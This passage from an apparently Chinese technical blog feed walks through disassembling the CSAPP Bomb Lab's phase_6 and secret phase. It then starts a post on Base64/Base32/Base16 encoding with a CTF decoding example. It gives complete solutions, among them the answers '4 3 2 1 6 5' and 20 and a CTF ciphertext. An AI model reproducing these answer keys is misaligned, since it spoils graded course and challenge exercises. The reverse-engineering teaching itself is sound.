0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi
0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt;
0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14
0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d
0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp
0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax
0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax
0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax
0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;
0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt;
0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d
0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d
0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;
0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx
0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax
0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax
0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)
0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;
0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;
0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx
0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx
0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;
0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13
0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</code></pre>

<p>第一部分整体而言不算太复杂，直接查看翻译后的代码：</p>
<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 读取6个4Byte数字放入从%r14寄存器指向地址开始的内存空间中
%r13 &#x3D; %rsp;
%rsi &#x3D; %rsp;
read_six_numbers();
%r14 &#x3D; %rsp;
for (%r12d &#x3D; 0; %r12 !&#x3D; 6; ) &#123;
	%rbp &#x3D; %r13;
    %eax &#x3D; Mem[%r13];
    %eax -&#x3D; 1;
    if (%eax &gt; 5u) &#123;
        explode_bomb();
    &#125;
    %r12d +&#x3D; 1;
    if (%r12d &#x3D;&#x3D; 6) break;
    for (%ebx &#x3D; %r12d; %ebx &lt;&#x3D; 5; ++%ebx) &#123;
        %rax &#x3D; %ebx;  &#x2F;&#x2F; 符号扩展
        %eax &#x3D; Mem[4 * %rax + %rsp];
        if (Mem[%rbp] &#x3D;&#x3D; %eax) &#123;
            explode_bomb();
        &#125;
	&#125;
	%r13 +&#x3D; 4;
&#125;</code></pre>

<p>与 phase_2 类似，首先读取 6 个数字，确定密码由 6 个数字组成。</p>
<p>随后主要关注循环中导致触发 <code>explode_bomb</code> 的条件，这些条件指明了密码的限定范围。第一个是 <code>%eax &gt; 5u</code>，注意前一条指令是 <code>%eax</code> 自减一，因此可以确定 6 个数字的范围都是 <code>[1, 6]</code>.</p>
<blockquote>
<p>这里自减一很有意思，刚开始看可能以为是多此一举，直接判断 %eax 是否大于 6u 不就完了吗？但是考虑到 0 这个特例，它在自减一后得到 -1，而 -1 满足无符号比较大于 5u，因此被排除在外。如果直接判断 %eax 是否大于 6u，那么数字的限定范围就变成了 [0, 6].</p>
</blockquote>
<p>后面的内层循环不难看出是用来判重的，因此六个数字的范围得以确定：每个数字都位于区间 <code>[1, 6]</code> 内且无重复数字。</p>
<h2 id="block-2"><a href="#block-2" class="headerlink" title="block_2"></a>block_2</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi
0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax
0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx
0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx
0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx
0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)
0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax
0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax
0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</code></pre>

<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; %r14 &#x3D; %rsp
&#x2F;&#x2F; 遍历6个数字，每个数字num的值变为7-num
%ecx &#x3D; 7;
for (%rax &#x3D; %r14, %rsi &#x3D; %rsp + 0x18; %rax !&#x3D; %rsi; %rax +&#x3D; 4) &#123;
	%edx &#x3D; %ecx - Mem[%rax];
	Mem[%rax] &#x3D; %edx;
&#125;</code></pre>

<p>第二部分非常简单，遍历输入的 6 个数字，将每个数字 num 更改为 7 - num.</p>
<h2 id="block-3"><a href="#block-3" class="headerlink" title="block_3"></a>block_3</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi
0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;
0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx
0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax
0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax
0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;
0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;
0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx
0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)
0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi
0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi
0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;
0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx
0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx
0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;
0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax
0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx
0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</code></pre>

<p>第三部分虽然代码量不大，但是跳转语句很多，逻辑非常复杂。这里我采用了分部的方式，首先改写为带 goto 语句的高级语言伪代码：</p>
<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">	%esi &#x3D; 0;
	goto phase_6_163;
phase_6_130:
	%rdx &#x3D; Mem[%rdx + 0x8];
	%eax +&#x3D; 1;
	if (%eax !&#x3D; %ecx) goto phase_6_130;
	goto phase_6_148;
phase_6_143:
	%edx &#x3D; 0x6032d0;
phase_6_148:
	Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;
	%rsi +&#x3D; 4;
	if (%rsi &#x3D;&#x3D; 0x18) goto phase_6_183;
phase_6_163:
	%ecx &#x3D; Mem[%rsp + %rsi];
	if (%ecx &lt;&#x3D; 1) goto phase_6_143;
	%eax &#x3D; 1;
	%edx &#x3D; 0x6032d0;
	goto phase_6_130;</code></pre>

<p>然后对照一些常见的形式 goto 改写为循环语句，这里的翻译过程比较繁琐，需要静下来仔细思考。</p>
<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%esi &#x3D; 0;
while (%rsi !&#x3D; 0x18) &#123;
	%ecx &#x3D; Mem[%rsp + %rsi];
	if (%ecx &gt; 1) &#123;
		%eax &#x3D; 1;
		%rdx &#x3D; 0x6032d0;
		while (%eax !&#x3D; %ecx) &#123;
			%rdx &#x3D; Mem[%rdx + 0x8];
			%eax +&#x3D; 1;
		&#125;
	&#125;
	else &#123;
		%edx &#x3D; 0x6032d0;
	&#125;
	Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;
	%rsi +&#x3D; 4;
&#125;</code></pre>

<p>观察翻译后的代码，似乎和 phase_5 类似，遍历每个数字，并将每个数字当作索引 i，在起始地址为 <code>0x6032d0</code> 的表中查找第 i 个元素，以 <code>%rsp + 0x20</code> 作为起始地址创建一个线性结构。</p>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/p6.png"></p>
<p>打印起始地址为 <code>0x6032d0</code> 的 12 个 8 字节数据，可以看到第二列中表示的值就是某一行的地址，且这些地址正好可以串联成一个线性结构，加上符号名 &quot;node&quot; 的提示，是不是很熟悉？没错，就是 <strong>链表</strong> 。上图每一行的第一列为值域，第二列为 next 域。</p>
<p>回过来观察代码，第三部分的作用就是将输入的六个数字作为索引，创建一个数组，每个数组元素都为索引对应的 next 域。</p>
<h2 id="block-4"><a href="#block-4" class="headerlink" title="block_4"></a>block_4</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx
0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax
0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi
0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx
0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx
0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)
0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax
0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax
0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;
0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx
0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</code></pre>

<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 创建链表
%rbx &#x3D; Mem[%rsp + 0x20];
for (%rax &#x3D; %rsp + 0x28, %rsi &#x3D; %rsp + 0x50; ; %rcx &#x3D; %rdx) &#123;
	%rcx &#x3D; %rbx;
	%rdx &#x3D; Mem[%rax];
	Mem[%rcx + 8] &#x3D; %rdx;
	%rax +&#x3D; 8;
	if (%rax &#x3D;&#x3D; %rsi) break;
&#125;</code></pre>

<p>理解清楚了第三部分，第四部分的作用就很明显了：根据第三部分创建的由 next 域构成的数组，创建一个链表结构。</p>
<h2 id="block-5"><a href="#block-5" class="headerlink" title="block_5"></a>block_5</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)
0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp
0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax
0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax
0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)
0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;
0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;
0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx
0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp
0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;
0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp
0x00000000004011fb &lt;+263&gt;:   pop    %rbx
0x00000000004011fc &lt;+264&gt;:   pop    %rbp
0x00000000004011fd &lt;+265&gt;:   pop    %r12
0x00000000004011ff &lt;+267&gt;:   pop    %r13
0x0000000000401201 &lt;+269&gt;:   pop    %r14
0x0000000000401203 &lt;+271&gt;:   ret</code></pre>

<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 遍历链表，判断是否从大到小排序，若不是，则引爆
Mem[%rdx + 8] &#x3D; 0;
for (%ebp &#x3D; 5; %ebp !&#x3D; 0; --%ebp) &#123;
	%rax &#x3D; Mem[%rbx + 8];
    %eax &#x3D; Mem[%rax];
    if (Mem[%rbx] &lt; %eax) &#123;
        explode_bomb();
    &#125;
   	%rbx &#x3D; Mem[%rbx + 8];
&#125;</code></pre>

<p>终于到最后一部分了，这一部分的作用很明显：判断链表是否有序，更准确地说，是否以非递增顺序排列。</p>
<p>那么本关的目标终于浮出水面了：</p>
<p><em>输入六个数字，对于每个数字 num，将 7 - num 作为索引，根据链表 node 重构出一个新的链表，并保证重构的链表按非递增顺序排列。</em></p>
<p>注意链表值域的比较只关注低 4 字节，因此链表各结点值域从大到小排序为：<code>3 4 5 6 1 2</code>，那么对应的输入数字为：<code>4 3 2 1 6 5</code>，即本关的正确答案。</p>
<h1 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h1><p>解决隐藏关卡首先要解决的问题是：如何进入？观察 main 函数的汇编代码，在结束 phase_6 之后、main 函数返回之前，只有 phase_defused 函数被调用，看来入口可能隐藏在一直以来被忽略的部分。</p>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-4.png"></p>
<p>对 phase_defused 进行反汇编，结果如下：</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004015c4 &lt;+0&gt;:     sub    $0x78,%rsp
0x00000000004015c8 &lt;+4&gt;:     mov    %fs:0x28,%rax
0x00000000004015d1 &lt;+13&gt;:    mov    %rax,0x68(%rsp)
0x00000000004015d6 &lt;+18&gt;:    xor    %eax,%eax
0x00000000004015d8 &lt;+20&gt;:    cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;
0x00000000004015df &lt;+27&gt;:    jne    0x40163f &lt;phase_defused+123&gt;
0x00000000004015e1 &lt;+29&gt;:    lea    0x10(%rsp),%r8
0x00000000004015e6 &lt;+34&gt;:    lea    0xc(%rsp),%rcx
0x00000000004015eb &lt;+39&gt;:    lea    0x8(%rsp),%rdx
0x00000000004015f0 &lt;+44&gt;:    mov    $0x402619,%esi
0x00000000004015f5 &lt;+49&gt;:    mov    $0x603870,%edi
0x00000000004015fa &lt;+54&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;
0x00000000004015ff &lt;+59&gt;:    cmp    $0x3,%eax
0x0000000000401602 &lt;+62&gt;:    jne    0x401635 &lt;phase_defused+113&gt;
0x0000000000401604 &lt;+64&gt;:    mov    $0x402622,%esi
0x0000000000401609 &lt;+69&gt;:    lea    0x10(%rsp),%rdi
0x000000000040160e &lt;+74&gt;:    call   0x401338 &lt;strings_not_equal&gt;
0x0000000000401613 &lt;+79&gt;:    test   %eax,%eax
0x0000000000401615 &lt;+81&gt;:    jne    0x401635 &lt;phase_defused+113&gt;
0x0000000000401617 &lt;+83&gt;:    mov    $0x4024f8,%edi
0x000000000040161c &lt;+88&gt;:    call   0x400b10 &lt;puts@plt&gt;
0x0000000000401621 &lt;+93&gt;:    mov    $0x402520,%edi
0x0000000000401626 &lt;+98&gt;:    call   0x400b10 &lt;puts@plt&gt;
0x000000000040162b &lt;+103&gt;:   mov    $0x0,%eax
0x0000000000401630 &lt;+108&gt;:   call   0x401242 &lt;secret_phase&gt;
0x0000000000401635 &lt;+113&gt;:   mov    $0x402558,%edi
0x000000000040163a &lt;+118&gt;:   call   0x400b10 &lt;puts@plt&gt;
0x000000000040163f &lt;+123&gt;:   mov    0x68(%rsp),%rax
0x0000000000401644 &lt;+128&gt;:   xor    %fs:0x28,%rax
0x000000000040164d &lt;+137&gt;:   je     0x401654 &lt;phase_defused+144&gt;
0x000000000040164f &lt;+139&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;
0x0000000000401654 &lt;+144&gt;:   add    $0x78,%rsp
0x0000000000401658 &lt;+148&gt;:   ret</code></pre>

<p>和之前的做法一样，将汇编代码翻译为 C 语言风格的伪代码，同时打印程序中用到的一些字符串：</p>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp.png"></p>
<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rax &#x3D; Mem[%fs + 0x28];
Mem[%rsp + 0x68] &#x3D; %rax;
if (Mem[%rip + 0x202181] &#x3D;&#x3D; 6) &#123; &#x2F;&#x2F; num_input_strings
	%r8 &#x3D; %rsp + 0x10;
	%rcx &#x3D; %rsp + 0xc;
	%rdx &#x3D; %rsp + 0x8;
	%rdi &#x3D; 0x603870;
	sscanf(%rdi, &quot;%d %d %s&quot;, %rdx, %rcx, %r8);
	if (%eax &#x3D;&#x3D; 3) &#123;
		%rdi &#x3D; %rsp + 0x10;
		if (strings_not_equal(%rdi, &quot;DrEvil&quot;) &#x3D;&#x3D; 0) &#123;
			puts(&quot;Curses, you&#39;ve found the secret phase!&quot;);
			puts(&quot;But finding it and solving it are quite different...&quot;);
			%eax &#x3D; 0;
			secret_phase();
		&#125;
	&#125;
	puts(&quot;Congratulations! You&#39;ve defused the bomb!&quot;);
&#125;
%rax &#x3D; Mem[%rsp + 0x68];
if (%rax !&#x3D; Mem[%fs + 0x28]) &#123;
	__stack_chk_fail();
&#125;</code></pre>

<p>仔细分析上述代码的逻辑，当输入的字符串个数等于 6 时，即解决了 phase_1 ~ phase_6 所有关卡后，程序调用 <code>sscanf</code> 从地址 <code>0x603870</code> 处读取以空格分隔的两个整数和一个字符串，分别存入寄存器 <code>%rdx</code>、<code>%rcx</code> 和 <code>%r8</code> 中，当函数返回值为 3，即成功匹配了 3 个值，且匹配到的第三个值（字符串）等于 &quot;DrEvil&quot; 时，即可进入隐藏关卡。</p>
<p>但是上面我们已经打印了地址 <code>0x603870</code> 处的字符串，为 <code>3 0</code>，只有两个，无法使得匹配数为 3. 我最开始想到的解决方法就是在调试过程中手动更改该地址处的值，但是这样的做法也只具备调试作用，进入隐藏关卡密码仍然无法得到。</p>
<p>换个角度来思考，这个 <code>3 0</code> 有没有可能不是硬编码的数据，而是我们手动输入的？记得之前 <code>phase_4</code> 的正确密码之一就是 <code>3 0</code>。</p>
<p>将断点设置在 phase_4 处，并打印 <code>%rdi</code> 寄存器的值， 发现正好就是 <code>0x603870</code>，因此 phase_4 的完整密码应该是 <code>3 0 DrEvil</code> （正如前面所说，前两位也可以是 <code>1 0</code>、<code>7 0</code> 等）。</p>
<blockquote>
<p>注意末尾的 DrEvil 在 phase_4 中并不会被读取，因为模式字符串为 “%d %d”，因此匹配成功的值最多为 2，不会影响 <code>cmp  $0x2, %eax</code> 的判断。</p>
</blockquote>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-2.png"></p>
<p>经过前面的准备，终于可以着手解决隐藏关卡了，相信有了前面这些关卡的锻炼，隐藏关卡不会显得太难。</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401242 &lt;+0&gt;:     push   %rbx
0x0000000000401243 &lt;+1&gt;:     call   0x40149e &lt;read_line&gt;
0x0000000000401248 &lt;+6&gt;:     mov    $0xa,%edx
0x000000000040124d &lt;+11&gt;:    mov    $0x0,%esi
0x0000000000401252 &lt;+16&gt;:    mov    %rax,%rdi
0x0000000000401255 &lt;+19&gt;:    call   0x400bd0 &lt;strtol@plt&gt;
0x000000000040125a &lt;+24&gt;:    mov    %rax,%rbx
0x000000000040125d &lt;+27&gt;:    lea    -0x1(%rax),%eax
0x0000000000401260 &lt;+30&gt;:    cmp    $0x3e8,%eax
0x0000000000401265 &lt;+35&gt;:    jbe    0x40126c &lt;secret_phase+42&gt;
0x0000000000401267 &lt;+37&gt;:    call   0x40143a &lt;explode_bomb&gt;
0x000000000040126c &lt;+42&gt;:    mov    %ebx,%esi
0x000000000040126e &lt;+44&gt;:    mov    $0x6030f0,%edi
0x0000000000401273 &lt;+49&gt;:    call   0x401204 &lt;fun7&gt;
0x0000000000401278 &lt;+54&gt;:    cmp    $0x2,%eax
0x000000000040127b &lt;+57&gt;:    je     0x401282 &lt;secret_phase+64&gt;
0x000000000040127d &lt;+59&gt;:    call   0x40143a &lt;explode_bomb&gt;
0x0000000000401282 &lt;+64&gt;:    mov    $0x402438,%edi
0x0000000000401287 &lt;+69&gt;:    call   0x400b10 &lt;puts@plt&gt;
0x000000000040128c &lt;+74&gt;:    call   0x4015c4 &lt;phase_defused&gt;
0x0000000000401291 &lt;+79&gt;:    pop    %rbx
0x0000000000401292 &lt;+80&gt;:    ret</code></pre>

<pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_line();
strtol(%rax, 0, 0xa);
%rbx &#x3D; %rax;
%eax &#x3D; %rax - 1;
if (%eax &gt; 0x3e8) &#123;  &#x2F;&#x2F; 无符号比较
	explode_bomb();
&#125;
fun7(0x6030f0, %ebx);
if (%eax !&#x3D; 2) &#123;
	explode_bomb();
&#125;
puts(0x402438);
phase_defused();</code></pre>

<p>可以看到，隐藏关卡的代码逻辑还是比较清晰的：读取一行，应该是隐藏关卡的密码，将其转换为 <code>long</code> 类型，然后又是和之前类似的范围限定语句，随后调用函数 <code>fun7</code>，如果返回值为 2，则密码输入正确。</p>
<p>问题的关键还是在于函数 <code>fun7</code>，其代码如下：</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401204 &lt;+0&gt;:     sub    $0x8,%rsp
0x0000000000401208 &lt;+4&gt;:     test   %rdi,%rdi
0x000000000040120b &lt;+7&gt;:     je     0x401238 &lt;fun7+52&gt;
0x000000000040120d &lt;+9&gt;:     mov    (%rdi),%edx
0x000000000040120f &lt;+11&gt;:    cmp    %esi,%edx
0x0000000000401211 &lt;+13&gt;:    jle    0x401220 &lt;fun7+28&gt;
0x0000000000401213 &lt;+15&gt;:    mov    0x8(%rdi),%rdi
0x0000000000401217 &lt;+19&gt;:    call   0x401204 &lt;fun7&gt;
0x000000000040121c &lt;+24&gt;:    add    %eax,%eax
0x000000000040121e &lt;+26&gt;:    jmp    0x40123d &lt;fun7+57&gt;
0x0000000000401220 &lt;+28&gt;:    mov    $0x0,%eax
0x0000000000401225 &lt;+33&gt;:    cmp    %esi,%edx
0x0000000000401227 &lt;+35&gt;:    je     0x40123d &lt;fun7+57&gt;
0x0000000000401229 &lt;+37&gt;:    mov    0x10(%rdi),%rdi
0x000000000040122d &lt;+41&gt;:    call   0x401204 &lt;fun7&gt;
0x0000000000401232 &lt;+46&gt;:    lea    0x1(%rax,%rax,1),%eax
0x0000000000401236 &lt;+50&gt;:    jmp    0x40123d &lt;fun7+57&gt;
0x0000000000401238 &lt;+52&gt;:    mov    $0xffffffff,%eax
0x000000000040123d &lt;+57&gt;:    add    $0x8,%rsp
0x0000000000401241 &lt;+61&gt;:    ret</code></pre>

<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">int</span> z <span class="token operator">=</span> <span class="token operator">*</span>x<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">></span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">==</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>又是一个递归函数，不过和 phase_4 不同，这个函数的代码显得很有规律，看到 <code>*(x + 8)</code> 和 <code>*(x + 16)</code> 这样的表达式很容易想到可能又是某种链接结构，不妨打印 <code>0x6030f0</code> 处的内容：</p>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-3.png"></p>
<p>这下结果很明确了，每个结点包含两个链接（指针）域，没错，正是二叉树。为了分析的方便，我根据上图的数据内容绘制了一个等价的二叉树，如下图所示：</p>
<blockquote>
<p>可以看到，每个结点由 4 个 8 字节组成，前三个应该分别是值域、左孩子、右孩子，最后一个全为 0 的 8 字节貌似很多余，个人推测应该是 C 语言结构体的 <strong>字节对齐</strong> 导致的。</p>
</blockquote>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/btree.png"></p>
<p>最后再回到函数 fun7 中，要使得最终结果等于 2，一种可能的计算方法如下：</p>
<p><img src="/2024/09/17/CSAPP-Bomb-Lab/formu.png"></p>
<p>我们只需要保证二叉树遍历时依次遍历左孩子、右孩子、左孩子，且输入密码正好等于叶子结点即可，<code>0x14</code> 正好就满足条件，因此隐藏关卡的密码为 20.</p>
<p>至此，”炸弹“ 成功被”拆除“。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>计算机基础</tag>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto基础</title>
    <url>/2021/08/09/Crypto%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>密码学是研究编制密码和破译密码的技术科学，本文将主要介绍密码学中常见的几种加密方式的原理以及实际的应用，并以<strong>攻防世界</strong>新手练习区例题为例进行分析。</p>
<span id="more"></span>

<h1 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h1><blockquote>
<p>Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。<br>Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。采用Base64编码具有不可读性，需要解码后才能阅读。</p>
</blockquote>
<h2 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h2><p>Base64中的<strong>64</strong>表示64个可打印的字符（具体范围如下表所示），而要完全表示64个不同的字符至少需要6位二进制数(2^6=64)，我们知道一个字符类型数据在计算机中占用1Byte的存储空间，而1Byte为8bit，即一个字符实际在计算机中存储的是一个8位二进制数。</p>
<p>Base64加密的实质是将每三个8bit字节转换为四个6bit字节（8*3=4*6），再在6bit字节的高位添0以补全为8位，最终转换为四个8bit字节，完成加密。例如：字符串<strong>s13</strong>，对应的ascii码为115 49 51，转换为二进制：01110011  00110001  00110011，将其分为4组：011100  110011  000100  110011，向高位补零：00011100  00110011  00000100  00110011，十进制为28 51 4 51，对照Base64编码表得到加密后的结果为：czEz，加密完成。</p>
<p><img src="/2021/08/09/Crypto%E5%9F%BA%E7%A1%80/Base64%E7%BC%96%E7%A0%81%E8%A1%A8.png"></p>
<p>我们发现这样貌似只能加密3的整数个字符，当末尾的字符无法凑成3的整数个的时候我们在用一个不在编码表中的字符加以代替，这个字符通常使用“=”，举个简单的例子：字符“A”，ascii码为65，转换成二进制数：01000001，由于此时末尾字符个数不为3的整数倍（1个），我们仍然将其分成四组，并且空位用“=”代替：010000  010===  ======  ======，对于不全为空的字节，在其末尾空位添零，全为空的字节在转换时用“=”代替：010000  010000  ======  ======，对应字符为：QQ==，加密完成。</p>
<p>通过以上示例不难发现Base64加密的密文中，“=”最多只能出现<strong>两个</strong>且只会在<strong>末尾</strong>出现。</p>
<h2 id="Base32-Base16"><a href="#Base32-Base16" class="headerlink" title="Base32,Base16"></a>Base32,Base16</h2><p>Base32,Base16与Base64类似，区别是他们分别得到5bit字节和4bit字节。Base32是将每5个8bit字节转换成8个5bit字节，编码字符范围为：大写字母A~Z和数字2~7，密文末尾最多可能出现<strong>7个</strong>“=”。Base16是将每个8bit字节转换成2个4bit字节，编码范围为：数字0~9和大写字母A~F，密文末尾不会出现“=”。</p>
<h2 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=0&id=5109&page=1">base64</a></p>
<h3 id="分析与解答"><a href="#分析与解答" class="headerlink" title="分析与解答"></a>分析与解答</h3><p>文本很明显是一串base64密文，直接解密即可，可以使用在线解密工具也可以直接用python的base64包解密，以下是python解密代码：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64

cipher <span class="token operator">=</span> <span class="token string">"Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9"</span>
res <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

